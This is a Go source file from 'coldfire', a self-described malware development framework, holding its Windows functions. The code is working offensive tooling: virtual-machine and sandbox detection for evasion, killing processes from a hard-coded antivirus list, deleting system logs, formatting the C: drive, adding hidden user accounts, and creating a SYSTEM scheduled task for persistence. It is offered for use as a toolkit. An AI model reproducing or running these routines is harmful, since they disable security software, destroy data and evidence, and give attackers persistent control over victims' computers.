// Package coldfire is a framework that provides functions
// for malware development that are mostly compatible with
// Linux and Windows operating systems.
package coldfire

import (
	"fmt"
	humanize "github.com/dustin/go-humanize"
	"github.com/minio/minio/pkg/disk"
	ps "github.com/mitchellh/go-ps"
	"io/ioutil"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

func killProcByPID(pid int) error {
	p := strconv.Itoa(pid)
	cmd := "taskkill /F /PID " + p
	_, err := cmdOut(cmd)
	return err
}

func info() string {
	var (
		u string
	)

	user, err := cmdOut("query user")
	if err != nil {
		user = "N/A"
	}
	u = user

	// o, err := cmdOut("ipconfig")
	// if err != nil {
	// 	ap_ip = "N/A" // (1)
	// }

	// entries := strings.Split(o, "\n")

	// for e := range entries {
	// 	entry := entries[e]
	// 	if strings.Contains(entry, "Default") {
	// 		ap_ip = strings.Split(entry, ":")[1] // (1)
	// 	}
	// }

	return user
}

func isRoot() bool {
	root := true

	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		root = false
	}

	return root
}

func cmdOut(command string) (string, error) {
	cmd := exec.Command("cmd", "/C", command)
	//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, err := cmd.CombinedOutput()
	out := string(output)
	return out, err
}

func sandboxFilepath() bool {
	EvidenceOfSandbox := make([]string, 0)
	FilePathsToCheck := [...]string{`C:\windows\System32\Drivers\Vmmouse.sys`,
		`C:\windows\System32\Drivers\vm3dgl.dll`, `C:\windows\System32\Drivers\vmdum.dll`,
		`C:\windows\System32\Drivers\vm3dver.dll`, `C:\windows\System32\Drivers\vmtray.dll`,
		`C:\windows\System32\Drivers\vmci.sys`, `C:\windows\System32\Drivers\vmusbmouse.sys`,
		`C:\windows\System32\Drivers\vmx_svga.sys`, `C:\windows\System32\Drivers\vmxnet.sys`,
		`C:\windows\System32\Drivers\VMToolsHook.dll`, `C:\windows\System32\Drivers\vmhgfs.dll`,
		`C:\windows\System32\Drivers\vmmousever.dll`, `C:\windows\System32\Drivers\vmGuestLib.dll`,
		`C:\windows\System32\Drivers\VmGuestLibJava.dll`, `C:\windows\System32\Drivers\vmscsi.sys`,
		`C:\windows\System32\Drivers\VBoxMouse.sys`, `C:\windows\System32\Drivers\VBoxGuest.sys`,
		`C:\windows\System32\Drivers\VBoxSF.sys`, `C:\windows\System32\Drivers\VBoxVideo.sys`,
		`C:\windows\System32\vboxdisp.dll`, `C:\windows\System32\vboxhook.dll`,
		`C:\windows\System32\vboxmrxnp.dll`, `C:\windows\System32\vboxogl.dll`,
		`C:\windows\System32\vboxoglarrayspu.dll`, `C:\windows\System32\vboxoglcrutil.dll`,
		`C:\windows\System32\vboxoglerrorspu.dll`, `C:\windows\System32\vboxoglfeedbackspu.dll`,
		`C:\windows\System32\vboxoglpackspu.dll`, `C:\windows\System32\vboxoglpassthroughspu.dll`,
		`C:\windows\System32\vboxservice.exe`, `C:\windows\System32\vboxtray.exe`,
		`C:\windows\System32\VBoxControl.exe`}
	for _, FilePath := range FilePathsToCheck {
		if _, err := os.Stat(FilePath); err == nil {
			EvidenceOfSandbox = append(EvidenceOfSandbox, FilePath)
		}
	}
	if len(EvidenceOfSandbox) == 0 {
		return false
	} else {
		return true
	}
}

func sandboxDisk(size int) bool {
	v := false
	d := `C:\`
	di, _ := disk.GetInfo(d)
	x := strings.Replace(humanize.Bytes(di.Total), "GB", "", -1)
	x = strings.Replace(x, " ", "", -1)
	z, err := strconv.Atoi(x)
	if err != nil {
		fmt.Println(err)
	}
	if z < size {
		v = true
	}
	return v
}

func sandboxTmp(entries int) bool {
	tmp_dir := `C:\windows\temp`
	files, err := ioutil.ReadDir(tmp_dir)
	if err != nil {
		return true
	}

	return len(files) < entries
}

func shutdown() error {
	c := "shutdown -s -t 60"
	_, err := cmdOut(c)

	return err
}

func pkillAv() error {
	av_processes := []string{
		"advchk.exe", "ahnsd.exe", "alertsvc.exe", "alunotify.exe", "autodown.exe", "avmaisrv.exe",
		"avpcc.exe", "avpm.exe", "avsched32.exe", "avwupsrv.exe", "bdmcon.exe", "bdnagent.exe", "bdoesrv.exe",
		"bdss.exe", "bdswitch.exe", "bitdefender_p2p_startup.exe", "cavrid.exe", "cavtray.exe", "cmgrdian.exe",
		"doscan.exe", "dvpapi.exe", "frameworkservice.exe", "frameworkservic.exe", "freshclam.exe", "icepack.exe",
		"isafe.exe", "mgavrtcl.exe", "mghtml.exe", "mgui.exe", "navapsvc.exe", "nod32krn.exe", "nod32kui.exe",
		"npfmntor.exe", "nsmdtr.exe", "ntrtscan.exe", "ofcdog.exe", "patch.exe", "pav.exe", "pcscan.exe",
		"poproxy.exe", "prevsrv.exe", "realmon.exe", "savscan.exe", "sbserv.exe", "scan32.exe", "spider.exe",
		"tmproxy.exe", "trayicos.exe", "updaterui.exe", "updtnv28.exe", "vet32.exe", "vetmsg.exe", "vptray.exe",
		"vsserv.exe", "webproxy.exe", "webscanx.exe", "xcommsvr.exe"}

	processList, err := ps.Processes()
	if err != nil {
		return err
	}

	for x := range processList {
		process := processList[x]
		proc_name := process.Executable()
		pid := process.Pid()

		if ContainsAny(proc_name, av_processes) {
			err := killProcByPID(pid)
			if err != nil {
				return err
			}
		}
	}

	return nil
}

func users() ([]string, error) {
	clear := []string{}
	o, err := cmdOut("net user")
	if err != nil {
		return nil, err
	}

	lines := strings.Split(o, "\n")

	for l := range lines {
		line := lines[l]
		if !ContainsAny(line, []string{"accounts for", "------", "completed"}) {
			clear = append(clear, line)
		}
	}

	return clear, nil
	// return strings.Fields(strings.Join(clear, " ")), nil
	// usrs := []string{}
	//   users, err := wapi.ListLoggedInUsers()
	//   if err != nil {
	//       return nil, err
	//   }
	//   for _, u := range(users){
	//       usrs = append(usrs, u.FullUser())
	//   }
	//   return usrs, nil
}

func networks() ([]string, error) {
	wifi_names := []string{}

	out, err := cmdOut("netsh wlan show networks")
	if err != nil {
		return nil, err
	}
	o := strings.Split(out, "\n")[1:]
	for entry := range o {
		e := o[entry]
		if strings.Contains(e, "SSID") {
			wifi_name := strings.Split(e, ":")[1]
			wifi_names = append(wifi_names, wifi_name)
		}
	}

	return wifi_names, nil
}

func clearLogs() error {
	os.Chdir("%windir%\\system32\\config")
	_, err := cmdOut("del *log /a /s /q /f")
	if err != nil {
		return err
	}

	return nil
}

func wipe() error {
	cmd := "format c: /fs:ntfs"
	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}

	return nil
}

func createUser(username, password string) error {
	cmd := f("net user %s %s /ADD", username, password)

	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}
	return nil
}

func wifiDisconnect() error {
	cmd := `netsh interface set interface name="Wireless Network Connection" admin=DISABLED`
	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}
	return nil
}

func disks() ([]string, error) {
	found_drives := []string{}

	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
		f, err := os.Open(string(drive) + ":\\")
		if err == nil {
			found_drives = append(found_drives, string(drive)+":\\")
			f.Close()
		}
	}
	return found_drives, nil
}

func addPersistentCommand(cmd string) error {
	_, err := cmdOut(fmt.Sprintf(`schtasks /create /tn "MyCustomTask" /sc onstart /ru system /tr "cmd.exe /c %s`, cmd))
	return err
}

// func dialog(message, title string) {
// 	zenity.Info(message, zenity.Title(title))
// }

// func SplitMultiSep(s string, seps []string) []string {
// 	f := func(c rune) bool {
// 		for _, sep := range seps {
// 			if c == sep { // what?
// 				return true
// 			}
// 		}
// 	}
// 	fields := strings.FieldsFunc(s, f)
// 	return fields
// }

/*

func keyboard_emul(keys string) error {

}

func proxy_tcp() error {

}

func proxy_udp() error {

}

func proxy_http() error {

}

func webshell(param, password string) error {

}

func stamp() {

}

func detect_user_interaction() (bool, error) {

}*/
